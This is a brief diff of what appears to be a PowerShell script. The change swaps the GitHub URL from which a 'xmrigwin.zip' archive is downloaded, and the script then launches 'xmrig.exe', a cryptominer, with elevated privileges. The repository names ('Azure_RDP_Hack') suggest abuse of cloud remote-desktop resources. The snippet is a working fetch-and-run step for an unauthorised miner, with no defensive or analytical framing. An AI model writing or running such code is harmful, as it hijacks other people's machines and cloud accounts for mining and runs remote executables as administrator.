@@ -39,4 +39,4 @@ function Get-Webfile ($url)
     Start-Process -FilePath "xmrig.exe" -Verb RunAs
 
 }
-Get-Webfile ("https://raw.githubusercontent.com/ngoc7sao9/Azure_RDP_Hack/main/xmrigwin.zip")
+Get-Webfile ("https://raw.githubusercontent.com/ngoc7sao9/Azure_RDP_NoNgrok/main/xmrigwin.zip")
